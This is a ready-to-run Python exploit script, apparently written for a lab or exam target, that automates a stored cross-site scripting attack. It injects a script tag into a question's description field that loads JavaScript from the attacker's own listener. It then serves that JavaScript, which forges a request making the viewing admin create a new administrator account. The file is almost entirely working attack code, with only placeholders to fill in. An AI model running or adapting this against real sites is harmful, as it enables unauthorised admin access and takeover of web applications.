#!/usr/bin/env python3

import requests 
import http.server
import socketserver
import threading
import traceback
from urllib.parse import urljoin

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/xssFileName.js": # change the file name (e.g, http://192.168.45.203/xssFileName.js)
            self.send_response(200)
            self.send_header("Content-type", "application/javascript")
            self.end_headers()

            # change the payload (XSS file content)
            payload = b"""
            var http = new XMLHttpRequest();
            var url = '/admin/users/create';
            var params = 'name=randomusername&email=newadmin@user.ltd&isAdmin=true&isMod=true';
            http.open('POST', url, true);
            http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            http.send(params);
            """

            self.wfile.write(payload)

            # Shut down the server after serving this request
            threading.Thread(target=self.server.shutdown, daemon=True).start()
        else:
            self.send_error(404, "File not found")


def xss(target, lhost):
    xssUrl = urljoin(target, "/question")
    xssHeaders = {"Content-Type": "application/x-www-form-urlencoded"}
    xssData = {
        "title": "i love XSS",
        "description": f"a<script src=http://{lhost}/xssFileName.js></script>em>", # XSS payload importing a remote malicious JavaScript payload
        "category": "1",
    }

    def run_server():
        with socketserver.TCPServer(("", 80), Handler) as httpd:
            print(f"[*] Serving on port 80, waiting for /xssFileName.js ...")
            httpd.serve_forever()
            print("[*] Server stopped.")

    # Start server in a background thread
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()

    # Deliver the XSS payload
    try:
        print("[*] Delivering the XSS attack...")
        xssRes = requests.post(xssUrl, headers=xssHeaders, data=xssData)
        if xssRes.status_code == 200:
            print("[+] XSS attack delivered successfully. Waiting for admin...")
        else:
            print(f"[-] Failed to deliver XSS (status {xssRes.status_code})")
    except Exception as e:
        print("[-] Error delivering the XSS attack: ", e)
        traceback.print_exc()

    # Keep main thread alive while server runs
    try:
        while server_thread.is_alive():
            server_thread.join(1)
    except KeyboardInterrupt:
        print("[*] Shutting down...")

xss("http://<target_ip_or_hostname>", "<listener_ip>")
